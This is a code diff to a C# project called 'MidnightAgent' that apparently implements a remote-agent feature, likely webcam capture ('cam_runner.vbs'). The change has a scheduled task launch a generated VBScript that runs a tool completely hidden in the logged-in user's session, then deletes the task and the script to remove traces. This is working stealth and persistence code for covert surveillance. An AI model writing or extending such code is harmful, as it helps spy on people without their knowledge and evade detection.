@@ -76,8 +76,18 @@ namespace MidnightAgent.Features
                         RunSchTasks($"/Delete /TN \"{taskName}\" /F");
                         
                         // Create Task
-                        // Note: We use the tool path directly.
-                        string createArgs = $"/Create /TN \"{taskName}\" /TR \"'{toolPath}' {cmdArgs}\" /SC ONCE /ST 00:00 /RI 1 /IT /RU Users /F";
+                        // WRAPPER: Use VBScript WScript.Shell to launch completely hidden (0)
+                        string vbsPath = Path.Combine(publicDir, "cam_runner.vbs");
+                        
+                        // VBScript String Escape: Replace " with "" inside the string literal
+                        string safeArgs = cmdArgs.Replace("\"", "\"\"");
+                        string vbsContent = $"CreateObject(\"WScript.Shell\").Run \"\"\"{toolPath}\"\"\" & \" \" & \"{safeArgs}\", 0, True";
+                        File.WriteAllText(vbsPath, vbsContent);
+                        
+                        string runCmd = $"wscript.exe \"{vbsPath}\"";
+                        
+                        // Create Task to run VBS
+                        string createArgs = $"/Create /TN \"{taskName}\" /TR \"{runCmd}\" /SC ONCE /ST 00:00 /RI 1 /IT /RU Users /F";
                         string createResult = RunSchTasks(createArgs);
                         
                         if (!createResult.Contains("SUCCESS"))
@@ -95,8 +105,9 @@ namespace MidnightAgent.Features
                             await Task.Delay(1000);
                         }
                         
-                        // Cleanup Task
+                        // Cleanup Task & VBS
                         RunSchTasks($"/Delete /TN \"{taskName}\" /F");
+                        try { File.Delete(vbsPath); } catch { }
                     }
                     catch (Exception ex)
                     {
@@ -112,6 +123,7 @@ namespace MidnightAgent.Features
                         Arguments = cmdArgs,
                         CreateNoWindow = true,
                         UseShellExecute = false,
+                        WindowStyle = ProcessWindowStyle.Hidden, // Extra safety
                         RedirectStandardOutput = true,
                         RedirectStandardError = true
                     };
